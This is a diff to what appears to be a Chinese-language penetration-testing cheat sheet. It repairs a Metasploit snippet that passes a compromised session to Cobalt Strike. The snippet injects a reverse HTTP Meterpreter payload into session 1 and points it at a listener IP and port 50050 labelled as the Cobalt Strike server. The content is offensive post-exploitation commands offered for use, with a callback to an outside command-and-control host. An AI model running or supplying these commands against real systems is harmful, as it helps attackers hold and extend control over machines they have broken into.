@@ -667,10 +667,13 @@ exploit
 
 **msf转cs**
 ```bash
-use exploit/windows/local/payload_injectset //PAYLOAD
-windows/meterpreter/reverse_http
+use exploit/windows/local/payload_inject
+set payload windows/meterpreter/reverse_http //PAYLOAD
 set DisablePayloadHandler true
 set LHOST 192.168.5.173 //cs的IP
 set LPORT 50050 //cs监听器的端口
-set SESSION 1exploit
+set SESSION 1
+exploit
 ```
+
+
